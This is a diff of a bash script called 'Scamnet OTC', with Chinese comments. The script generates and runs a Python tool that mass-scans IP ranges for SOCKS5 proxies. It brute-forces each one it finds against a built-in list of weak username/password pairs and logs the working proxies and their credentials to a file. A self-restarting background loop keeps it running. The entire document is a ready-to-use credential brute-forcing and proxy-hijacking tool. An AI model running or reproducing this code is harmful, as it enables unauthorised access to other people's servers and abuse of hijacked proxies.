@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet OTC v4.1（永不崩溃：独立 Session + 局部 Semaphore + 防 OOM）
+# main.sh - Scamnet OTC v4.0（永不崩溃：独立事件循环 + 零共享 + 生产稳定）
 set -euo pipefail
 IFS=$'\n\t'
 
@@ -8,7 +8,7 @@ LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LATEST_LOG="$LOG_DIR/latest.log"
 RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
 
-echo -e "${GREEN}[OTC] Scamnet v4.1 (永不崩溃 + 独立 Session)${NC}"
+echo -e "${GREEN}[OTC] Scamnet v4.0 (永不崩溃 + 独立事件循环)${NC}"
 echo "日志 → $LATEST_LOG"
 
 # ==================== 依赖安装 ====================
@@ -58,40 +58,47 @@ else
 fi
 echo -e "${GREEN}[*] 端口: $PORT_INPUT → $PORTS_CONFIG${NC}"
 
-# ==================== 生成脚本 ====================
+# ==================== 生成扫描器（v5.0 独立运行）===================
 cat > "$RUN_SCRIPT" << 'EOF'
 #!/bin/bash
 set -euo pipefail
 cd "$(dirname "$0")"
 
-# === config.yaml ===
+# === 写入 config.yaml ===
 cat > config.yaml << CONFIG
 input_range: "$START_IP-$END_IP"
 $PORTS_CONFIG
 timeout: 5.0
-max_concurrent: 300
-batch_size: 500
+max_concurrent: 200
+batch_size: 300
 CONFIG
 
-# === scanner_async.py ===
-cat > scanner_async.py << 'PY'
+# === scanner_batch.py（每批独立运行）===
+cat > scanner_batch.py << 'PY'
 #!/usr/bin/env python3
 import asyncio
 import aiohttp
 import ipaddress
 import yaml
+import sys
 from tqdm import tqdm
-import warnings
-warnings.filterwarnings("ignore", category=DeprecationWarning)
 
+# 读取批次参数
+if len(sys.argv) != 3:
+    print("Usage: scanner_batch.py <start_idx> <end_idx>")
+    sys.exit(1)
+START_IDX = int(sys.argv[1])
+END_IDX = int(sys.argv[2])
+
+# 加载配置
 with open('config.yaml') as f:
     cfg = yaml.safe_load(f)
 INPUT_RANGE = cfg['input_range']
 RAW_PORTS = cfg.get('ports', cfg.get('range'))
 TIMEOUT = cfg.get('timeout', 5.0)
-MAX_CONCURRENT = cfg.get('max_concurrent', 300)
-BATCH_SIZE = cfg.get('batch_size', 500)
+MAX_CONCURRENT = cfg.get('max_concurrent', 200)
 
+# 解析 IP 和端口
 def parse_ip_range(s):
     start, end = s.split('-')
     return [str(ipaddress.IPv4Address(i)) for i in range(int(ipaddress.IPv4Address(start)), int(ipaddress.IPv4Address(end)) + 1)]
@@ -104,12 +111,10 @@ def parse_ports(p):
 
 ips = parse_ip_range(INPUT_RANGE)
 ports = parse_ports(RAW_PORTS)
-tasks = [(ip, port) for ip in ips for port in ports]
-print(f"[*] IP: {len(ips):,}, 端口: {len(ports)}, 总任务: {len(tasks):,}")
+all_tasks = [(ip, port) for ip in ips for port in ports]
+batch_tasks = all_tasks[START_IDX:END_IDX]
 
-valid_count = 0
-WEAK_PAIRS = [
-    # === 原始列表 ===
+WEAK_PAIRS = [# === 原始列表 ===
     ("123","123"),("admin","admin"),("root","root"),("user","user"),("proxy","proxy"),("111","111"),("1","1"),("qwe123","qwe123"),
     ("abc","abc"),("aaa","aaa"),("1234","1234"),("socks5","socks5"),("123456","123456"),("12345678","12345678"),("admin123","admin"),
     ("admin","123456"),("12345","12345"),("test","test"),("guest","guest"),("admin",""),("888888","888888"),("test123","test123"),
@@ -183,8 +188,7 @@ async def get_country(ip, session):
             async with session.get(url, timeout=5) as r:
                 if r.status == 200:
                     code = (await r.json()).get("countryCode","").strip().upper() if "json" in url else (await r.text()).strip().upper()
-                    if len(code) == 2 and code.isalpha():
-                        return code
+                    if len(code) == 2: return code
         except: pass
     return "XX"
 
@@ -196,57 +200,55 @@ async def test_socks5(ip, port, session, auth=None):
     except:
         return False, 0, None
 
-async def brute_weak(ip, port, session):
-    for pair in WEAK_PAIRS:
-        ok, lat, exp = await test_socks5(ip, port, session, pair)
-        if ok:
-            return pair, lat, exp
-    return None, 0, None
-
-async def scan_batch(batch):
-    global valid_count
-    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, limit_per_host=10, ssl=False, force_close=True)
+async def scan(ip, port):
+    connector = aiohttp.TCPConnector(limit=10, ssl=False, force_close=True)
     async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as session:
-        async def _scan(ip, port):
-            async with semaphore:
-                ok, lat, exp = await test_socks5(ip, port, session)
-                if not ok:
-                    weak = await brute_weak(ip, port, session)
-                    if weak[0]:
-                        ok, lat, exp = True, weak[1], weak[2]
-                if ok:
-                    country = await get_country(exp, session) if exp != ip else await get_country(ip, session)
-                    auth_str = f"{weak[0]}:{weak[1]}" if 'weak' in locals() and weak[0] else ""
-                    valid_count += 1
-                    fmt = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
-                    with open("socks5_valid.txt", "a", encoding="utf-8") as f:
-                        f.write(fmt + "\n")
-                    print(f"[+] 发现 #{valid_count}: {fmt}")
-
-        tasks = [_scan(ip, port) for ip, port in batch]
-        await asyncio.gather(*tasks)
+        ok, lat, exp = await test_socks5(ip, port, session)
+        if not ok:
+            for pair in WEAK_PAIRS:
+                ok, lat, exp = await test_socks5(ip, port, session, pair)
+                if ok: break
+        if ok:
+            country = await get_country(exp, session) if exp != ip else await get_country(ip, session)
+            auth_str = f"{pair[0]}:{pair[1]}" if ok and 'pair' in locals() and pair[0] else ""
+            fmt = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
+            with open("socks5_valid.txt", "a", encoding="utf-8") as f:
+                f.write(fmt + "\n")
+            print(f"[+] 发现: {fmt}")
 
 async def main():
-    with open("result_detail.txt", "w") as f: f.write("# Scamnet v4.9\n")
-    with open("socks5_valid.txt", "w") as f: f.write("# socks5://...\n")
-    pbar = tqdm(total=len(tasks), desc="扫描", unit="conn", ncols=100)
-    for i in range(0, len(tasks), BATCH_SIZE):
-        batch = tasks[i:i+BATCH_SIZE]
-        await scan_batch(batch)
-        pbar.update(len(batch))
-    pbar.close()
-    print(f"\n[+] 完成！发现 {valid_count} 个 → socks5_valid.txt")
+    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
+    async def _scan(ip, port):
+        async with semaphore:
+            await scan(ip, port)
+    tasks = [_scan(ip, port) for ip, port in batch_tasks]
+    for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="扫描", unit="conn"):
+        await f
 
 if __name__ == "__main__":
     asyncio.run(main())
 PY
 
-chmod +x scanner_async.py
-> result_detail.txt
+chmod +x scanner_batch.py
+
+# === 分批运行（每批独立进程）===
+TOTAL_TASKS=$(python3 -c "import yaml; c=yaml.safe_load(open('config.yaml')); ips=len([i for i in range(int(__import__('ipaddress').IPv4Address(c['input_range'].split('-')[0])), int(__import__('ipaddress').IPv4Address(c['input_range'].split('-')[1]))+1)]); ports=len([int(p) for p in c.get('ports', c.get('range', '').split('-'))] if isinstance(c.get('ports'), list) else (lambda r: list(range(int(r.split('-')[0]), int(r.split('-')[1])+1)) if '-' in str(c.get('range','')) else [int(c.get('ports',0))])(c.get('range',''))); print(ips*ports)")
+BATCH_SIZE=$(yq e '.batch_size' config.yaml 2>/dev/null || echo 300)
+echo "[*] 总任务: $TOTAL_TASKS, 分批大小: $BATCH_SIZE"
+
 > socks5_valid.txt
-echo "[OTC] 扫描启动..."
-python3 scanner_async.py
+> result_detail.txt
+echo "# Scamnet v5.0" > result_detail.txt
+echo "# socks5://..." > socks5_valid.txt
+
+for ((i=0; i<TOTAL_TASKS; i+=BATCH_SIZE)); do
+    end=$((i + BATCH_SIZE))
+    [ $end -gt $TOTAL_TASKS ] && end=$TOTAL_TASKS
+    echo "[*] 扫描批次: $i-$end"
+    python3 scanner_batch.py $i $end
+done
+
+echo "[+] 扫描完成！结果 → socks5_valid.txt"
 EOF
 
 chmod +x "$RUN_SCRIPT"
@@ -254,6 +256,6 @@ chmod +x "$RUN_SCRIPT"
 # ==================== 启动（自动重启）===================
 echo -e "${GREEN}[*] 启动后台扫描（永不崩溃）...${NC}"
 echo " 查看进度: tail -f $LATEST_LOG"
-echo " 停止扫描: pkill -f scanner_async.py"
-nohup bash -c "while true; do echo '[OTC] 扫描启动...'; $RUN_SCRIPT; echo '[!] 崩溃重启中...'; sleep 3; done" > "$LATEST_LOG" 2>&1 &
+echo " 停止扫描: pkill -f scanner_batch.py"
+nohup bash -c "while true; do echo '[OTC] 扫描启动...'; $RUN_SCRIPT; echo '[!] 重启中...'; sleep 3; done" > "$LATEST_LOG" 2>&1 &
 echo -e "${GREEN}[+] 已启动！PID: $!${NC}"
